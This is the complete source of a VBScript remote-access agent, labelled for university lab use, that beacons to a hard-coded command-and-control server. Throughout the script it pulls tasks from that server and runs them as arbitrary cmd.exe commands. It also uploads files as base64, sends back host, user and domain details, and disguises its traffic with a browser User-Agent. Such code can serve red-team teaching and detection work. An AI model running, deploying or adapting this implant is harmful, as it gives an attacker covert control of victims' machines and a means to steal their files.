' ============================================================================
' Fixed VBScript Agent - University Lab Use Only
' ============================================================================

Option Explicit

' --- Configuration ---
Const C2_URL = "http://192.168.2.80:8080/task"
Const REPORT_URL = "http://192.168.2.80:8080/report"
Const BEACON_INTERVAL_MS = 10000  ' 10 seconds
Const AGENT_ID = "AGENT-001"

' --- Global Objects ---
Dim g_fso, g_wshShell, g_wshNetwork
Set g_fso = CreateObject("Scripting.FileSystemObject")
Set g_wshShell = CreateObject("WScript.Shell")
Set g_wshNetwork = CreateObject("WScript.Network")

' --- Debug counter ---
Dim g_retrieveTaskCallCount
g_retrieveTaskCallCount = 0

' ============================================================================
' UTILITY FUNCTIONS
' ============================================================================

Function GetSystemInfo()
    On Error Resume Next
    Dim info, objWMI, colOS, objOS, colCS, objCS

    info = "[AGENT_ID] " & AGENT_ID & vbCrLf
    info = info & "[HOSTNAME] " & g_wshNetwork.ComputerName & vbCrLf
    info = info & "[USERNAME] " & g_wshNetwork.UserName & vbCrLf

    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
    Set colOS = objWMI.ExecQuery("SELECT Caption, Version FROM Win32_OperatingSystem")
    For Each objOS In colOS
        info = info & "[OS] " & objOS.Caption & " (" & objOS.Version & ")" & vbCrLf
        Exit For
    Next

    Set colCS = objWMI.ExecQuery("SELECT Domain FROM Win32_ComputerSystem")
    For Each objCS In colCS
        info = info & "[DOMAIN] " & objCS.Domain & vbCrLf
        Exit For
    Next

    Set objWMI = Nothing
    GetSystemInfo = info
    On Error GoTo 0
End Function

Function FileToBase64(filePath)
    On Error Resume Next

    If Not g_fso.FileExists(filePath) Then
        FileToBase64 = ""
        Exit Function
    End If

    Dim adoStream
    Set adoStream = CreateObject("ADODB.Stream")
    adoStream.Type = 1
    adoStream.Open
    adoStream.LoadFromFile filePath

    Dim xmlDoc, node
    Set xmlDoc = CreateObject("MSXML2.DOMDocument")
    Set node = xmlDoc.createElement("b64")
    node.dataType = "bin.base64"
    node.nodeTypedValue = adoStream.Read

    FileToBase64 = Replace(node.text, vbCrLf, "")

    adoStream.Close
    Set adoStream = Nothing
    Set xmlDoc = Nothing
    On Error GoTo 0
End Function

Sub SendReport(content)
    On Error Resume Next
    Dim xhr, attempt

    For attempt = 1 To 3
        Set xhr = CreateObject("MSXML2.XMLHTTP")
        xhr.Open "POST", REPORT_URL, False
        xhr.setRequestHeader "Content-Type", "text/plain"
        xhr.setRequestHeader "User-Agent", "Mozilla/5.0"
        xhr.send content

        If Err.Number = 0 And xhr.status = 200 Then
            Set xhr = Nothing
            Exit Sub
        End If

        WScript.Sleep 1000 * attempt
    Next

    Set xhr = Nothing
    On Error GoTo 0
End Sub

Function ExecuteShell(cmd)
    On Error Resume Next
    Dim exec, output, timeout

    Set exec = g_wshShell.Exec("cmd.exe /c " & cmd & " 2>&1")

    timeout = 0
    Do While exec.Status = 0 And timeout < 300
        WScript.Sleep 100
        timeout = timeout + 1
    Loop

    output = exec.StdOut.ReadAll()
    If Len(output) = 0 Then
        output = "[No output or command timed out]"
    End If

    Set exec = Nothing
    ExecuteShell = output
    On Error GoTo 0
End Function

Function RetrieveTask()
    Dim xhr, response, task, errNum, errDesc

    ' Increment global counter
    g_retrieveTaskCallCount = g_retrieveTaskCallCount + 1

    ' CACHE-BUSTING: Add timestamp to URL
    Dim requestUrl
    requestUrl = C2_URL & "?_=" & Timer() & g_retrieveTaskCallCount


    On Error Resume Next
    Set xhr = CreateObject("MSXML2.XMLHTTP")
    errNum = Err.Number
    errDesc = Err.Description
    On Error GoTo 0

    If errNum <> 0 Then
        RetrieveTask = "sleep"
        Exit Function
    End If

    On Error Resume Next
    xhr.Open "GET", requestUrl, False  ' Use requestUrl instead of C2_URL
    xhr.setRequestHeader "Cache-Control", "no-cache"
    xhr.setRequestHeader "Pragma", "no-cache"
    errNum = Err.Number
    errDesc = Err.Description
    On Error GoTo 0

    If errNum <> 0 Then
        Set xhr = Nothing
        RetrieveTask = "sleep"
        Exit Function
    End If

    On Error Resume Next
    xhr.setRequestHeader "User-Agent", "Mozilla/5.0"
    xhr.send
    errNum = Err.Number
    errDesc = Err.Description

    ' Also check object state
    Dim statusCode
    statusCode = xhr.status
    response = xhr.responseText
    On Error GoTo 0


    If errNum <> 0 Then
        Set xhr = Nothing
        RetrieveTask = "sleep"
        Exit Function
    End If

    If statusCode <> 200 Then
        Set xhr = Nothing
        RetrieveTask = "sleep"
        Exit Function
    End If


    Set xhr = Nothing

    ' Parse JSON
    task = ParseJSON(response, "task")

    If task = "" Then
        task = "sleep"
    End If

    RetrieveTask = task
End Function

Function ParseJSON(jsonText, key)
    On Error Resume Next
    Dim startPos, endPos, value

    ' Method 1: "task":"value"
    startPos = InStr(jsonText, """" & key & """:""")
    If startPos > 0 Then
        startPos = startPos + Len("""" & key & """:""")
        endPos = InStr(startPos, jsonText, """")
        If endPos > startPos Then
            ParseJSON = Mid(jsonText, startPos, endPos - startPos)
            Exit Function
        End If
    End If

    ' Method 2: "task": "value"
    startPos = InStr(jsonText, """" & key & """: """)
    If startPos > 0 Then
        startPos = startPos + Len("""" & key & """: """)
        endPos = InStr(startPos, jsonText, """")
        If endPos > startPos Then
            ParseJSON = Mid(jsonText, startPos, endPos - startPos)
            Exit Function
        End If
    End If

    ParseJSON = ""
    On Error GoTo 0
End Function

Function GetStringHash(s)
    ' Simple hash for debugging - sum of character codes
    Dim i, total
    total = 0
    For i = 1 To Len(s)
        total = total + Asc(Mid(s, i, 1))
    Next
    GetStringHash = total
End Function

Sub ProcessTask(task)
    On Error Resume Next
    Dim taskType, taskValue, parts, output

    If InStr(task, ":") > 0 Then
        parts = Split(task, ":", 2)
        taskType = UCase(Trim(parts(0)))
        taskValue = Trim(parts(1))
    Else
        taskType = UCase(Trim(task))
        taskValue = ""
    End If

    Select Case taskType

        Case "SHELL"
            output = ExecuteShell(taskValue)
            SendReport("[SHELL] " & taskValue & vbCrLf & vbCrLf & output)

        Case "GET_FILE", "UPLOAD"
            Dim base64
            base64 = FileToBase64(taskValue)

            If Len(base64) > 0 Then
                SendReport(base64)
            Else
                SendReport("[UPLOAD_ERROR] File not found: " & taskValue)
            End If

        Case "SYSINFO"
            SendReport(GetSystemInfo())

        Case "KILL", "EXIT", "QUIT"
            SendReport("[AGENT] " & AGENT_ID & " terminating")
            WScript.Sleep 2000
            WScript.Quit

        Case "SLEEP"
            ' No operation

        Case Else
            SendReport("[ERROR] Unknown command: " & task)
    End Select

    On Error GoTo 0
End Sub

' ============================================================================
' MAIN LOOP
' ============================================================================

Sub Main()
    On Error Resume Next
    Dim currentTask, loopCount, killFilePath

    ' Initial beacon
    SendReport("[INITIAL_BEACON]" & vbCrLf & GetSystemInfo())

    loopCount = 0
    killFilePath = "C:\Windows\Temp\agent_kill.txt"

    Do
        currentTask = ""

        loopCount = loopCount + 1

        ' Check kill switch
        If g_fso.FileExists(killFilePath) Then
            SendReport("[AGENT] Terminating due to kill file")
            WScript.Quit
        End If

        ' Fetch new task - this MUST happen every iteration
        currentTask = RetrieveTask()

        ' Verify we actually got a response
        If currentTask = "" Then
            currentTask = "sleep"
        End If

        ' Heartbeat every 10 loops
        If loopCount Mod 10 = 0 Then
            SendReport("[HEARTBEAT] Loop #" & loopCount)
        End If

        ' Process task ONLY if it's not sleep
        If currentTask <> "sleep" And Len(currentTask) > 0 Then
            ProcessTask currentTask
            currentTask = "sleep"
        Else

        End If

        WScript.Sleep BEACON_INTERVAL_MS
    Loop
End Sub

' ============================================================================
' ENTRY POINT
' ============================================================================

Main()